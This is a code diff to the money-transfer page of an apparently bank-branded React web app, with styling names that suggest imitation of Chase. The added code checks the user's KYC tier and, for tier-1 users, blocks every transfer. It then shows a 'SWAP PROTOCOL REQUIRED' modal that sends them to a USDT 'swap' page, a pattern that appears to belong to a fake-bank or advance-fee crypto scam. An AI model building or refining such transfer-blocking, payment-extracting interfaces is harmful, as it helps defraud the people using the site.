@@ -1,16 +1,20 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { useNavigate } from 'react-router-dom';
 import api from '../../api/axios';
 import { formatUSD } from '../../utils/formatCurrency';
 import Button from '../../components/ui/Button';
 import Input from '../../components/ui/Input';
 import toast from 'react-hot-toast';
-import { CheckCircle2, User, ArrowRight, UserPlus } from 'lucide-react';
+import { CheckCircle2, User, ArrowRight, UserPlus, AlertTriangle } from 'lucide-react';
 import BeneficiaryList from '../../components/transfer/BeneficiaryList';
 
 const SendMoney = () => {
+  const navigate = useNavigate();
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [recipient, setRecipient] = useState(null);
+  const [userTier, setUserTier] = useState(null);
+  const [showSwapModal, setShowSwapModal] = useState(false);
   const [formData, setFormData] = useState({
     account_number: '',
     amount: '',
@@ -18,6 +22,20 @@ const SendMoney = () => {
     pin: '',
     confirm_name: ''
   });
+
+  useEffect(() => {
+    const fetchTier = async () => {
+      try {
+        const response = await api.get('?action=get_kyc_status');
+        if (response.data.status === 'success') {
+          setUserTier(response.data.data.kyc_tier);
+        }
+      } catch (e) {
+        console.error('Failed to fetch KYC tier');
+      }
+    };
+    fetchTier();
+  }, []);
 
   const handleResolve = async (accNum) => {
     const num = accNum || formData.account_number;
@@ -53,6 +71,12 @@ const SendMoney = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+
+    if (userTier === 1) {
+      setShowSwapModal(true);
+      return;
+    }
+
     if (step === 1 && recipient) {
       if (parseFloat(formData.amount) > 200000) {
         return setStep(1.5); // Large amount confirmation step
@@ -229,6 +253,31 @@ const SendMoney = () => {
           </div>
         )}
       </div>
+
+      {showSwapModal && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className="bg-white rounded-3xl w-full max-w-md p-8 shadow-2xl text-center animate-in fade-in zoom-in duration-300">
+            <div className="mx-auto w-20 h-20 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mb-6">
+              <AlertTriangle size={40} />
+            </div>
+            <h2 className="text-2xl font-black text-chase-navy mb-4 uppercase tracking-tight">SWAP PROTOCOL REQUIRED</h2>
+            <p className="text-gray-600 mb-8 leading-relaxed">
+              To complete this transfer, a usdt swap protocol is required to complete this transfer.
+            </p>
+            <div className="space-y-3">
+              <Button onClick={() => navigate('/transfer/swap')} className="w-full py-4 text-lg shadow-lg shadow-chase-blue/20">
+                SWAP NOW
+              </Button>
+              <button
+                onClick={() => setShowSwapModal(false)}
+                className="text-gray-400 hover:text-gray-600 font-medium transition-colors"
+              >
+                Cancel Transfer
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
